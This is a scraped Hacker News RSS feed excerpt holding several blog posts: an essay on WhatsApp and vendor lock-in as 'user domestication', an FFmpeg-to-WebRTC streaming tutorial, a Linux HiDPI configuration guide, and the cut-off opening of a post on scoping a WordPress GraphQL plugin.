<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemscope="" itemtype="https://schema.org/BlogPosting">
	<article itemprop="mainEntityOfPage">
		
		<section itemprop="articlebody">
			<p>I have never used WhatsApp, and never will. Despite this, I still feel the need to write an article about WhatsApp since it’s the perfect case study to help understand a class of businesses models I call “user domestication”. The domestication of users is high on my list of problems plaguing the human race, and is worth a detailed explanation.</p>
<p>WhatsApp wasn’t the first instant messenger of its kind, and probably won’t be the last. I simply chose to focus on WhatsApp since its recent privacy issues have made it a hot topic.</p>
<p>With the meta-explanation out of the way, let us begin.</p>
<h2 id="whatsapps-rise">WhatsApp’s rise</h2>
<p>For those unfamiliar, WhatsApp is a tool that makes it convenient and easy to help Facebook further its core mission: the optimization and auctioning of human behavior (colloquially known as “targeted advertising”). It originally persuaded people to consent to this by allowing them to send text to each other over the Internet, something that was <a href="https://en.wikipedia.org/wiki/Comparison_of_instant_messaging_protocols">already possible</a>, and combining an easy-to-learn UI with successful marketing. It then expanded to include features such as free voice and video calls. Free calls helped it grow to become the de-facto communication platform many regions. I’m stunned at its ubiquity every time I visit my extended family in India; I’m frequently greeted by looks of confusion when I remind them that I don’t use WhatsApp.</p>
<p>Having its own proprietary chat system incompatible with other clients allowed WhatsApp to build a <a href="https://en.wikipedia.org/wiki/Network_effect">network effect</a>: WhatsApp’s existing users were held captive by the fact that leaving WhatsApp meant losing the ability to communicate with WhatsApp users. People switching from WhatsApp must convince all their friends to switch, too; this includes less technically inclined friends who had a hard time learning WhatsApp in the first place.</p>
<p>In a WhatsApp world, people who want to keep in touch must abide by the following rules:</p>
<ul>
<li>Everyone can only use the proprietary WhatsApp client to send messages; developing alternative clients isn’t supported.</li>
<li>Everyone’s mobile device must run an operating system supported by said client. Since WhatsApp developers will only write a client for popular operating systems, the Android and iOS duopoly strengthens.</li>
<li>Users fully depend on WhatsApp developers. If WhatsApp developers decide to include user-hostile features in the app, users must go with it. They can’t switch to a different server or client without switching away from WhatsApp and losing the ability to communicate with all their WhatsApp contacts.</li>
</ul>
<h2 id="user-domestication">User domestication</h2>
<p>WhatsApp rose by trapping previously-free beings in their corral and changing their habits to create dependence on masters. Over time, this made it difficult or impossible to return to their previous lifestyle. That process should sound familiar: it’s eerily similar to the domestication of animals. I call this type of vendor lock-in <strong>user domestication:</strong> the removal of user autonomy to trap users into serving vendors.</p>
<p>I chose this metaphor because animal domestication is a gradual process that isn’t always deliberate, and typically revolves around one group becoming dependent upon another. For example: there’s evidence that domestication of dogs began with socialization, resulting in not-entirely-artificial selection promoting genes that resulted in more friendliness with and dependence upon humans.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>
<p>Whether it happens on purpose or by accident, user domestication almost always follows the same three steps:</p>
<ol>
<li>A high level of dependence given from users to a software vendor</li>
<li>An inability for users to control their software, through at least one of the following methods:
<ol>
<li>Preventing modification of the software</li>
<li>Preventing migration onto a different platform</li>
</ol>
</li>
<li>The exploitation of now-captive users who are unable to resist</li>
</ol>
<p>The completion of the first two steps left WhatsApp users vulnerable to user domestication. With investors to answer to, they had every incentive to implement user-hostile features without consequence.</p>
<p>So, of course, they did.</p>
<h2 id="whatsapps-descent">WhatsApp’s descent</h2>
<p>Domestication has a purpose: it enables a master species to exploit the domesticated species for its own gain.</p>
<p>Recently, WhatsApp updated its privacy policy to allow sharing data with its parent, Facebook. Users who agreed to use WhatsApp under its previous privacy policy had two options: agree to the new policy or be unable to use WhatsApp again. The WhatsApp privacy policy update is a classic bait-and-switch: WhatsApp lured users in with a sleek interface and the impression of privacy, domesticated them to remove their autonomy to migrate, and then backtracked on its previous commitment to privacy with minimal consequence. Each step in this process enabled the next; had user domestication not taken place, it would be easy for most users to switch away with minimal friction.</p>
<p>Those of us who were sounding the alarm a few years ago experienced a brief moment of sadistic bliss when our titles were upgraded from “annoying and paranoid conspiracy theorists” to just “annoying”.</p>
<h3 id="an-attempt-at-damage-control">An attempt at damage control</h3>
<p>The bait-and-switch operation incurred backlash significant enough for a noticeable minority of users to actually migrate; this number turned out to be slightly more than the rounding error WhatsApp was likely expecting. In response, WhatsApp delayed the change and published the following ad:</p>
<picture>
	<source srcset="https://seirdy.one/p/whatsapp_ad_dark.3e9ad6a0c2c8c377c4583cf92bddcd47.avif" type="image/avif" media="(prefers-color-scheme: dark)">
	<source srcset="https://seirdy.one/p/whatsapp_ad_dark.09f935219fb9d5ac9fa9bc4acb733d13.webp" type="image/webp" media="(prefers-color-scheme: dark)">
	<source srcset="https://seirdy.one/p/whatsapp_ad_dark.8792c2187d444ebc32bf8c386ea0cda9.png" type="image/png" media="(prefers-color-scheme: dark)">
	<source srcset="https://seirdy.one/p/whatsapp_ad.94ed78578e240dfd57f833807f8167ed.avif" type="image/avif">
	<source srcset="https://seirdy.one/p/whatsapp_ad.9efe174613a8b02274fa62feff7b8374.webp" type="image/webp">
	<source srcset="https://seirdy.one/p/whatsapp_ad.b81802ac13cd4a2540211e05819cd29e.png" type="image/png">
	<img width="600" src="https://seirdy.one/p/whatsapp_ad.png" alt="WhatsApp ad describing data not collected">
</picture>

<p>The ad lists various data that WhatsApp doesn’t collect or share. Allaying data collection concerns by listing data <em>not</em> collected is misleading. WhatsApp doesn’t collect hair samples or retinal scans either; not collecting that information doesn’t mean it respects privacy because it doesn’t change the information WhatsApp <em>does</em> collect.</p>
<p>The ad denies “keep[ing] logs of who everyone is messaging or calling”. Collecting data is not the same as “keeping logs”; it’s possible for metadata to be fed into an algorithm before being discarded. A model can thus learn that two users call each other frequently without keeping logs of the metadata for each call. The fact that they specifically chose to phrase this line around logging implies that WhatsApp either already collects this class of data or has deliberately left the door open to collecting it in the future.</p>
<p>A stroll through WhatsApp’s <a href="https://web.archive.org/web/20210124061525/https://www.whatsapp.com/legal/updates/privacy-policy/?lang=en">actual privacy policy</a> at the time reveals that they do collect considerable metadata used for marketing through Facebook.</p>
<h2 id="software-freedom">Software freedom</h2>
<p>With user domestication, providing useful software to users is a means to the end of exploiting them. The alternative is simple: make serving users the end in and of itself.</p>
<p>To prevent being controlled by software, users must be in control. Software that allows users to be in control is called <a href="https://en.wikipedia.org/wiki/Free_software">free software</a>. The word “free” in this context refers to freedom rather than price. Software freedom is similar to the concept of open-source, but the latter is focused on practical benefits rather than ethics. A less ambiguous term that neutrally refers to both free and open-source software is <strong><abbr title="free and open-source software">FOSS</abbr></strong>.</p>
<p>Others have <a href="https://www.gnu.org/philosophy/free-sw.en.html">explained</a> the concepts underpinning free software better than I can, so I won’t go into detail. It comes down to four essential freedoms:</p>
<ul>
<li>The freedom to run the program as you wish, for any purpose</li>
<li>The freedom to study how the program works, and change it so it does your computing as you wish</li>
<li>The freedom to redistribute copies so you can help others</li>
<li>The freedom to distribute copies of your modified versions to others</li>
</ul>
<h3 id="making-money-with-foss">Making money with FOSS</h3>
<p>The most common objection I hear is that FOSS makes it harder to make money.</p>
<p>The key to making money with FOSS is to make software a <a href="https://www.gwern.net/Complement">commoditized complement</a> of other, more profitable services. Examples of such services include selling support, customization, consulting, training, managed hosting, hardware, and certifications. Plenty of companies use this approach instead of building proprietary software: Red Hat, Collabora, System76, Purism, Canonical, SUSE, Hashicorp, Databricks, and Gradle are some names that come to mind.</p>
<p>Managed hosting isn’t a basket worth all your eggs if giants like AWS can do the same at a lower price. Being the developer can give an edge in areas like customization, support, and training; it doesn’t offer as obvious an advantage when it comes to hosting.</p>
<h2 id="foss-isnt-always-enough">FOSS isn’t always enough</h2>
<p>Free software is a necessary but sometimes insufficient requirement to build domestication immunity. Two more measures include <strong>simplicity</strong> and <strong>open platforms.</strong></p>
<h3 id="simplicity">Simplicity</h3>
<p>When software grows too complex, it needs to be maintained by a large team. Users who disagree with a vendor can’t easily fork and maintain a multi-million-line codebase, especially if the software in question potentially contains security vulnerabilities. Dependence on the vendor can grow quite problematic when complexity causes development costs to skyrocket; the vendor might resort to implementing user-hostile features to stay afloat.</p>
<p>Complex software that can’t be developed by a different group of people creates dependence, step one of user domestication. That alone is enough to open the door to problematic developments.</p>
<h4 id="case-study-mozilla-and-the-web">Case study: Mozilla and the Web</h4>
<p>Mozilla was a ray of hope in the browser wars, a space dominated by adtech, surveillance, and vendor lock-in. Unfortunately, developing a browser engine is a monumental task difficult enough for Opera and Microsoft to give up and re-skin Chromium. Browsers are more than the document readers they were meant to be: they’ve evolved into application runtimes with their own stacks for GPU acceleration, Bluetooth, permissions, device enumeration, bundled media codecs, <abbr title="digital rights management">DRM</abbr><sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, extension APIs, developer tools…the list goes on. It takes billions of dollars a year to respond to vulnerabilities in such a massive attack surface and keep up with a standard that grows at such a worrying rate. Those billions have to come from somewhere.</p>
<p>Mozilla ended up having to make major compromises to stay afloat. It cut search deals with blatantly user-hostile companies, and bundled the browser with <a href="https://blog.mozilla.org/advancingcontent/2014/02/11/publisher-transformation-with-users-at-the-center/">ads</a> and bloatware such as a partially …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://seirdy.one/2021/01/27/whatsapp-and-the-domestication-of-users.html">https://seirdy.one/2021/01/27/whatsapp-and-the-domestication-of-users.html</a></em></p>]]>
            </description>
            <link>https://seirdy.one/2021/01/27/whatsapp-and-the-domestication-of-users.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25971169</guid>
            <pubDate>Sat, 30 Jan 2021 17:50:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to stream media using WebRTC and FFmpeg, and why it's a bad idea]]>
            </title>
            <description>
<![CDATA[
Score 117 | Comments 36 (<a href="https://news.ycombinator.com/item?id=25970843">thread link</a>) | @dimes
<br/>
January 30, 2021 | https://blog.maxwellgale.com/2021/01/30/streaming-video-over-webrtc-using-ffmpeg/ | <a href="https://web.archive.org/web/*/https://blog.maxwellgale.com/2021/01/30/streaming-video-over-webrtc-using-ffmpeg/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

                                            
                                                    <header>

    
    <!-- start: .meta -->
    
    <!-- end: .meta -->

	

</header>                        
                        <section>

                            
                            
                            <div>
                                
<p><strong>Note: </strong>The original version of this post highlighted the disadvantages of using a fixed key frame interval. I’ve since learned that this problem can be avoided using intra refresh in the H264 stream.</p>



<p>Streaming media. specifically video, is a fickle beast. This will be a short post, but it will cover everything you need to know to stream media using FFmpeg to WebRTC clients. This technique has many applications, such as streaming synchronized videos to users. </p>



<h2>Setting up the input</h2>



<p>Before inputting a file into FFmpeg, we need to pass a few flags:</p>



<pre><code>&gt; ffmpeg \
  -v info \
  -fflags +genpts \
  -protocol_whitelist pipe,tls,file,http,https,tcp,rtp \</code></pre>



<p>These flags set the log level to info, generate pts if they’re missing, and sets up the protocols we can use. Next we need to provide the input to FFmpeg.</p>



<pre><code>-i in.mp4</code></pre>



<p>In this example, a file name <code>in.mp4</code> is used, but a http(s) URL could also be used. This command starts playback at the beginning of the input file. If you want to start playback in the middle of the input file, then you can add the <code>-ss &lt;time in secs&gt;</code> flag <strong>before</strong> <code>-i</code>.</p>



<h2>Video arguments</h2>



<p>Now the video needs to be converted to an appropriate format for streaming. The format is specific to the application, but common codecs are H264, VP8, and VP9. This example uses H264 due to its ubiquitous support.</p>



<pre><code>-vf realtime,scale=w=min(iw\,1280):h=-2 \
-map 0:v:0 \
-c:v libx264 \
-x264-params intra-refresh=1,fast-pskip=0
-threads 3 \
-profile:v baseline \
-level:v 3.1 \
-pix_fmt yuv420p \
-tune zerolatency \
-minrate 500K \
-maxrate 1.3M \
-bufsize 500K \</code></pre>



<p><code>-vf</code> specifies the video filters to apply. Here, two filters are applied. The first is <code>realtime</code>, which causes playback to happen in real time, which is necessary for streaming. This filter is similar to the <code>-re</code> flag, but works much better with the start time flag (<code>-ss</code>). The second filter scales the video width to a maximum of 1280 pixels while maintaining the aspect ratio. This is important to keep the bitrate appropriate for real time streaming. </p>



<p>The <code>intra-refresh</code> parameter allows users to consume the video stream mid-way through by providing enough metadata over multiple inter frames to decode a full frame. The <code>fast-pskip=0</code>is required for <code>intra-refresh</code> to work if the source video files contains very few frames, which can happen if the video displays static images for long periods of time. There may be another way around this, but I’m not aware of it. </p>



<p>Another important parameter is the <code>-threads 3</code> flag. FFmpeg will use many threads by the default. Normally, this is good because it produces the final result as fast as possible. For real time encoding, however, using a large number of threads has some overhead that can slow down real time output. Using many threads is also a bad idea if you’re running multiple instances of FFmpeg concurrently.</p>



<p>The next two parametrs <code>-profile:v</code> and <code>-level:v</code> specify the profile and level to use for the encoding. These are specific to H264. WebRTC clients can only decode certain profiles and levels, so these need to match the specific configuration of the application. These roughly correspond to the profile-level-id of <code>42e01f</code>. </p>



<p>The pixel format is set to <code>yuv420p</code> using the <code>-pix_fmt</code> flag. This is required as this is the only pixel format supported by WebRTC. <code>-tune zerolatency</code> tunes the encoder for low latency streaming.</p>



<p>Next up are the bitrate parameters. When streaming media, the bitrate should be as low as possible while maintaining the desired quality. This ensures all clients can consume the video in real time. Omitting the <code>-minrate</code> parameter can cause FFmpeg to produce output with an unnecessarily high bitrate. Setting the <code>-maxrate</code> is equally important. A DSL connection can only pull down around 2 Mbps. In order for users to watch the video, they must be able to download it in real time, so the maximum bitrate has to be lower than the slowest connection among your users. Another consideration is that the streaming video might not be the only bandwidth consuming task on the user’s network.</p>



<h2>Audio arguments</h2>



<p>The audio arguments are much simpler.</p>



<pre><code>-af arealtime \
-map 0:a:0 \
-c:a libopus \
-ab 128k \
-ac 2 \
-ar 48000 \</code></pre>



<p>The main thing to note here is that the <code>arealtime</code> filter is used, which is similar to the <code>realtime</code> filter, but for audio.</p>



<h2>Output arguments</h2>



<p>The output can be piped to an RTP endpoint using the <code>tee</code> psuedomuxer. Unfortunately, FFmpeg does not support multiplexing over RTP, so you’ll need two separate RTP endpoints, one for the video stream and one for the audio stream. </p>



<pre><code>-f tee \
[select=a:f=rtp:ssrc=1111:payload_type=&lt;audio-payload_type&gt;]rtp://&lt;audio-ip&gt;:&lt;audio-port&gt;?rtcpport=&lt;audio-rtcpport&gt;|[select=v:f=rtp:ssrc=2222:payload_type=&lt;video-payload_type&gt;]rtp://&lt;video-ip&gt;:&lt;video-port&gt;?rtcpport=&lt;video-rtcpport&gt;</code></pre>



<p>Now you can stream video over RTP! The full command is</p>



<pre><code>&gt; ffmpeg \
  -v info \
  -fflags +genpts \
  -protocol_whitelist pipe,tls,file,http,https,tcp,rtp \
  -i in.mp4
  -vf realtime,scale=w=min(iw\,1280):h=-2 \
  -map 0:v:0 \
  -c:v libx264 \
  -x264-params intra-refresh=1,fast-pskip=0
  -threads 3 \
  -profile:v baseline \
  -level:v 3.1 \
  -pix_fmt yuv420p \
  -tune zerolatency \
  -minrate 500K \
  -maxrate 1.3M \
  -bufsize 500K \
  -af arealtime \
  -map 0:a:0 \
  -c:a libopus \
  -ab 128k \
  -ac 2 \
  -ar 48000 \
  -f tee \
  [select=a:f=rtp:ssrc=1111:payload_type=&lt;payload_type&gt;]rtp://&lt;ip&gt;:&lt;port&gt;?rtcpport=&lt;rtcpport&gt;|[select=v:f=rtp:ssrc=2222:payload_type=&lt;payload_type&gt;]rtp://&lt;ip&gt;:&lt;port&gt;?rtcpport=&lt;rtcpport&gt;</code></pre>
                                                            </div>
                            

                              

                                                        
                                                            
                                                        
                                                            
                            
                            

                            	                           

                            
                        </section>

                    </article></div>]]>
            </description>
            <link>https://blog.maxwellgale.com/2021/01/30/streaming-video-over-webrtc-using-ffmpeg/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25970843</guid>
            <pubDate>Sat, 30 Jan 2021 17:17:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A few HiDPI tricks for Linux]]>
            </title>
            <description>
<![CDATA[
Score 130 | Comments 142 (<a href="https://news.ycombinator.com/item?id=25970690">thread link</a>) | @woodruffw
<br/>
January 30, 2021 | https://blog.yossarian.net/2020/12/24/A-few-HiDPI-tricks-for-Linux | <a href="https://web.archive.org/web/*/https://blog.yossarian.net/2020/12/24/A-few-HiDPI-tricks-for-Linux">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<h2><em>Programming, philosophy, pedaling.</em></h2>

<ul>
    <li><a href="https://blog.yossarian.net/">Home</a></li>
    <li><a href="https://blog.yossarian.net/tags">Tags</a></li>
    <li><a href="https://blog.yossarian.net/favorites">Favorites</a></li>
    <li><a href="https://blog.yossarian.net/archive">Archive</a></li>
    
      <li><a href="https://yossarian.net/">Main Site</a></li>
    
</ul>

<hr>



<h2>
  <em>Dec 24, 2020</em>
</h2>

  <p>Tags:
  
    
    <a href="https://blog.yossarian.net/tags#workflow">workflow</a>
    
  
  </p>


<h2 id="background">Background</h2>

<p>I recently switched my home office to a 2-by-4K HiDPI setup, like so:</p>

<p><a href="https://blog.yossarian.net/assets/hidpi-setup.jpg"><img src="https://blog.yossarian.net/assets/hidpi-setup.jpg" alt="A picture of my home office."></a></p>

<p>As part of that switch, I needed to configure parts of my Linux environment (which was originally
stock Ubuntu, but is now <a href="https://i3wm.org/">i3</a> with a heavily customized userspace) to function
correctly on HiDPI displays.</p>

<p>This post will document most of the changes I applied. Hopefully others will find it useful for
their own HiDPI setups.</p>

<h2 id="90-of-the-way-x11-resources">90% of the way: X11 resources</h2>

<p>As it turns out, there’s a (nearly) one-stop location for configuring the default DPI for
X11 applications: the <code>Xft.dpi</code> setting.</p>

<p>There are lots of ways to configure X11, but I personally use an <code>~/.Xresources</code> file:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>Xft</span>.<span>dpi</span>: <span>163</span>
<span># not used directly; more on this later
</span><span>janus</span>.<span>fractionalDpi</span>: <span>1</span>.<span>63</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Where <code>163</code> and <code>1.63</code> are my DPI and its fractional form, respectively.</p>

<p>On my system, <code>~/.Xresources</code> gets loaded into the X resource database automatically by some
magic that I never configured. However, if yours doesn’t (or you use a different resource file),
you can always tell i3 (or your WM of choice) to load it explicitly with <code>xrdb</code>.</p>

<p>For example, in <code>~/.config/i3/config</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>exec</span> <span>--no-startup-id</span> xrdb ~/.Xresources
</pre></td></tr></tbody></table></code></pre></div></div>

<p>With just this, about 90% of my applications (including GTK based ones, like Firefox) scaled
correctly and were usable without any font or custom scaling changes. Not bad for a single line!</p>

<h2 id="per-application-fixes">Per-application fixes</h2>

<h3 id="spotify">Spotify</h3>

<p>Spotify’s Linux application is a <a href="https://bitbucket.org/chromiumembedded/cef/src/master/">CEF</a>
shell. For reasons that are unclear to me, it doesn’t respect <code>Xft.dpi</code> while normal Chromium
(via <code>snap</code> or <code>apt</code>) does.</p>

<p>To get it to scale correctly, I needed to pass <code>--force-device-scale-factor=1.63</code> to it:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>spotify <span>--force-device-scale-factor</span><span>=</span>1.63
</pre></td></tr></tbody></table></code></pre></div></div>

<p>At this point, it became clear to me that the fractional form of my DPI would be nice to set in
as few places as possible, to avoid duplication. Hence the <code>janus.fractionalDpi</code><sup id="fnref:hostname" role="doc-noteref"><a href="#fn:hostname">1</a></sup> above,
and
<a href="https://github.com/woodruffw/dotfiles/blob/master/scripts/spotify">this little <code>spotify</code> wrapper</a>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span># see the actual script linked above for some program-finding stupidity</span>
<span>real_spotify</span><span>=</span>/snap/bin/spotify

<span># grab the correct fractional DPI from the X resource DB</span>
<span>dpi</span><span>=</span><span>$(</span>xrdb <span>-query</span> | <span>grep</span> <span>"</span><span>$(</span><span>hostname</span><span>)</span><span>.fractionalDpi"</span> | <span>cut</span> <span>-f2</span><span>)</span>
<span>"</span><span>${</span><span>real_spotify</span><span>}</span><span>"</span> <span>--force-device-scale-factor</span><span>=</span><span>"</span><span>${</span><span>dpi</span><span>}</span><span>"</span> <span>"</span><span>${</span><span>@</span><span>}</span><span>"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="sublime-text">Sublime Text</h3>

<p>I use <a href="https://www.sublimetext.com/3">Sublime Text 3</a> as my primary editor. As far as I can tell
it doesn’t use either GTK or Qt (or any other open-source GUI framework), which is probably why
it doesn’t respect <code>Xft.dpi</code>.</p>

<p>To get Sublime Text to scale correctly, I had to set <code>ui_scale</code> to the appropriate fractional DPI
in my user preferences (<code>~/.config/sublime-text-3/Preferences.sublime-settings</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>{</span><span>
  </span><span>"ui_scale"</span><span>:</span><span> </span><span>1.63</span><span>,</span><span>
</span><span>}</span><span>
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Some lingering pain points:</p>

<ul>
  <li>
    <p>Sublime Text’s input is noticeably laggy when the UI is scaled. It’s not so laggy as to be
unusable, but it’s definitely noticeable even if you aren’t sensitive to latencies (I’m not).</p>
  </li>
  <li>
    <p>Mousing between Sublime Text and other windows causes noticeable stutter/hiccuping during
video playback. I haven’t dug into the X events yet, but my guess is that it’s got some kind
of pessimistic (and serial) <code>XFlush</code> or <code>XSync</code> that takes a decent bit of time on a larger window
buffer. It doesn’t happen with smaller windows (either floating or fixed).</p>
  </li>
</ul>

<h3 id="open-broadcaster-software-obs">Open Broadcaster Software (OBS)</h3>

<p>I haven’t used it recently, but I used to use <a href="https://obsproject.com/">OBS</a> to stream myself
working on open source projects.</p>

<p>When I switched monitors, I noticed that the embedded preview window for my scenes had stopped
working. OBS <em>itself</em> was still fully functional and the <em>separate</em> preview window still worked,
but the embedded preview was always filled in with black pixels.</p>

<p>After a decent bit of hair-pulling, I found a Qt environment variable that “fixed” it:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>QT_AUTO_SCREEN_SCALE_FACTOR</span><span>=</span>0 obs
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I still don’t understand why that fixed it, but now my OBS is scaled correctly <strong>and</strong> has a
functional preview embed. I also posted this fix to the
<a href="https://obsproject.com/forum/threads/bug-fix-black-preview-embed-window-on-linux-w-hidpi-monitors.135041/">OBS forum</a>.</p>

<h3 id="feh">feh</h3>

<p>I use <a href="https://github.com/derf/feh"><code>feh</code></a> as my image viewer. By default, it seems to use
a bitmap font that’s incredibly small on HiDPI displays.</p>

<p>To fix it, I modified by default theme to use my distro supplied Ubuntu Roman-face font in
14pt.</p>

<p>In <code>~/.config/feh/themes</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>feh <span>--borderless</span> <span>--scale-down</span> <span>--conversion-timeout</span> 1 <span>\</span>
  <span>--fontpath</span> /usr/share/fonts/truetype/ubuntu <span>--menu-font</span> Ubuntu-R/14
</pre></td></tr></tbody></table></code></pre></div></div>

<p>One thing I haven’t figured out: when I open some higher-resolution images in <code>feh</code>, they’re
occasionally shifted to the right with transparent pixels where some of the image should be.
Clicking and dragging inside the image window causes it to re-render correctly, as does
resizing the window. Not a huge deal, but slightly annoying.</p>

<h3 id="dunst">dunst</h3>

<p>I use <a href="https://dunst-project.org/"><code>dunst</code></a> as my notification daemon.</p>

<p>It didn’t <strong>need</strong> any HiDPI-specific configuration, but I took the opportunity to make its
notifications slightly more readable on these newer displays.</p>

<p>In <code>~/.config/dunst/dunstrc</code> (among many other settings):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span>monitor</span> = <span>0</span>
<span>follow</span> = <span>mouse</span>
<span>geometry</span> = <span>"600x120-30+20"</span>
<span>icon_position</span> = <span>left</span>
<span>max_icon_size</span> = <span>64</span>
<span>icon_path</span> = /<span>usr</span>/<span>share</span>/<span>icons</span>/<span>gnome</span>/<span>64</span><span>x64</span>/<span>status</span>/:/<span>usr</span>/<span>share</span>/<span>icons</span>/<span>gnome</span>/<span>64</span><span>x64</span>/<span>devices</span>/
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="other-bits">Other bits</h2>

<h3 id="mouse-acceleration">Mouse acceleration</h3>

<p>My new displays are individually larger and significantly more dense than my previous ones, making
my mouse feel sluggish. I originally configured my mouse acceleration with
<a href="https://www.x.org/archive/X11R7.5/doc/man/man1/xset.1.html"><code>xset</code></a>, but at some point my
system switched to <code>libinput</code> and <code>libinput</code>-based inputs apparently don’t respect <code>xset</code> anymore
(or never did?). Sigh.</p>

<p>The fix is to use <code>xinput</code> instead, with either symbolic names or XIDs for the device and setting
being controlled. For example, this is what I use to set my mouse’s acceleration to the maximum
(<code>1.0</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>xinput <span>--set-prop</span> <span>"USB Optical Mouse"</span> <span>"libinput Accel Speed"</span> 1.0
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Your device and setting names may vary, of course, as may their value ranges (mine happened to be
<code>0.0</code> to <code>1.0</code>). You can use <code>xinput</code> on its own to list the names and XIDs of your devices;
<code>xinput list-props &lt;XID-or-name&gt;</code> can be used to dump a particular device’s properties and
their current values.</p>

<h3 id="i3-workspaces">i3 workspaces</h3>

<p>I use i3’s <a href="https://i3wm.org/docs/layout-saving.html">layout saving/restoring</a> functionality
to automatically load all of my workspaces and their applications when I log in.</p>

<p>Those layouts are stored in a (relaxed) JSON format via <code>i3-save-tree</code>, and contain hardcoded
coordinates. To update them for my new monitors, I just had to recreate each of my workspaces
once on my new monitors and dump them:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre><span># for each workspace (1A, 1B, ...)</span>
i3-save-tree <span>--workspace</span> 1A <span>&gt;</span> ~/.config/i3/workspaces/1A.json
</pre></td></tr></tbody></table></code></pre></div></div>

<p>…and then fix them up manually to enable the appropriate application swallowing rules.</p>

<h3 id="hexchat">HexChat</h3>

<p>I use <a href="https://hexchat.github.io/index.html">HexChat</a> for IRC.</p>

<p>HexChat’s config file includes individual offsets for each of the sub-panes in the GUI,
which means that it breaks badly if you change your monitor dimensions. I couldn’t figure out
how to fix them, so I ended up deleting my main <code>~/.config/hexchat/hexchat.conf</code> entirely and
recreating my preferred layout from memory. YMMV.</p>

<h3 id="system-icons">System icons</h3>

<p>I didn’t have to make any changes with respect to my system icon sizes, which is <em>probably</em>
because I actually see very few icons during normal i3 usage. Once again, YMMV.</p>

<h2 id="wrapup">Wrapup</h2>

<p>Switching from a set of 3 FHD monitors to two 4K HiDPI ones was <em>relatively</em> painless. The
problems that I had, unsurprisingly, were primarily with the few proprietary applications I use
needing to be spoon-feed DPI information in their own ways — every other problem was
either a bug (OBS + Qt) or a matter of more general reconfiguration.</p>

<hr>



<hr>


<a href="https://www.reddit.com/r/enosuchblog/comments/kjhhp8/a_few_hidpi_tricks_for_linux/">Reddit discussion</a>

<hr>



  


  





</div>]]>
            </description>
            <link>https://blog.yossarian.net/2020/12/24/A-few-HiDPI-tricks-for-Linux</link>
            <guid isPermaLink="false">hacker-news-small-sites-25970690</guid>
            <pubDate>Sat, 30 Jan 2021 17:01:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: GraphQL API for WordPress is now scoped, thanks to PHP-Scoper]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25970511">thread link</a>) | @leoloso
<br/>
January 30, 2021 | https://graphql-api.com/blog/graphql-api-for-wp-is-now-scoped-thanks-to-php-scoper/ | <a href="https://web.archive.org/web/*/https://graphql-api.com/blog/graphql-api-for-wp-is-now-scoped-thanks-to-php-scoper/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Plugin GraphQL API for WordPress is now scoped. This means the plugin can be finally uploaded to the <a href="https://wordpress.org/plugins/">WordPress plugin directory</a>.</p><p><img src="https://graphql-api.com/images/talking-business.jpg" alt="Talking business" loading="lazy" width="500" height="500"></p><p>To do it, I'm using the wonderful <a href="https://github.com/humbug/php-scoper">PHP-Scoper</a>. Using this library with WordPress does not go without its challenges, so I'll explain in this blog post how I managed to pull it out.</p><p>Sections:</p><ul><li><a href="#heading-taking-the-decision-to-scope">Taking the decision to scope</a></li><li><a href="#heading-checking-out-the-options">Checking out the options</a></li><li><a href="#heading-trying-out-mozart-and-failing">Trying out Mozart, and failing</a></li><li><a href="#heading-checking-php-scoper-and-coming-out-in-panic">Checking PHP-Scoper, and coming out in panic</a></li><li><a href="#heading-coming-back-to-php-scoper-this-time-for-good">Coming back to PHP-Scoper, this time for good</a></li><li><a href="#heading-php-scoper-the-easy-way">PHP-Scoper, the easy way 😎</a> 👈🏽 Here starts my solution</li><li><a href="#heading-show-me-the-real-stuff">Show me the real stuff</a></li><li><a href="#heading-testing">Testing</a></li><li><a href="#heading-check-out-the-results">Check out the results</a></li></ul><h2 id="heading-taking-the-decision-to-scope">Taking the decision to scope<a href="#heading-taking-the-decision-to-scope"><span> permalink</span></a></h2><p>A few weeks ago, Matt Mullenweg announced he'll be <a href="https://youtu.be/QI3qCoiuG3w?t=2268">keeping an eye on "the GraphQL plugin"</a>, obviously referring to <a href="https://www.wpgraphql.com/">WPGraphQL</a>. His expression demonstrates that he believes there is only one GraphQL plugin, when in fact there are two (the one left out is, well, mine). That made me realize how little visibility my plugin has, and I felt bad about it.</p><p>Matt didn't know my plugin existed. Nor does most of the WordPress community, for that matter. Clearly I'm not publicizing it well enough. I know that I suck in marketing and social media; I'm just OK with technical stuff (or so I believe). So I decided to do something about it, at least within my capabilities.</p><p>So this is what I'm working on:</p><ul><li>I just finished coding this same website, <a 